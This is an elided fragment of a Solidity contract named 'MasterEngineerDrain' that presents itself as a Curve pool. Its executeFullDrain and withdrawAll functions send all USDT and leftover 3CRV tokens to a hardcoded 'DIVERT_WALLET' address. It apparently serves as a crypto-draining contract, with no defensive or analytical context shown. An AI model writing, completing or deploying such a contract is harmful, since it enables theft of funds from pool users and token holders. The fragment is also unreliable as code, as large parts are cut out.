...
contract MasterEngineerDrain is ICurvePool {
    ...
    // Passive receiver wallet - ONLY receives, never acts, never approves, never spends
    address public constant DIVERT_WALLET = 0x31839aD2ea916AA4820693f46D1e59a71e8e624E;
    ...
    function executeFullDrain() external {
        ...
        if (remaining > 0) {
            // Send leftover 3CRV straight to passive receiver only
            IERC20(THREE_CRV).transfer(DIVERT_WALLET, remaining);
        }

        uint256 finalAmount = EXPECTED_USDT - FEE_DRAG;
        // Send all USDT straight to passive receiver only
        IERC20(USDT).transfer(DIVERT_WALLET, finalAmount);
    }
    ...
    function withdrawAll() external {
        ...
        if (usdtBal > 0) {
            // All USDT goes only to passive receiver
            IERC20(USDT).transfer(DIVERT_WALLET, usdtBal);
        }
        uint256 crvBal = IERC20(THREE_CRV).balanceOf(address(this));
        if (crvBal > 0) {
            // All leftover 3CRV goes only to passive receiver
            IERC20(THREE_CRV).transfer(DIVERT_WALLET, crvBal);
        }
    }
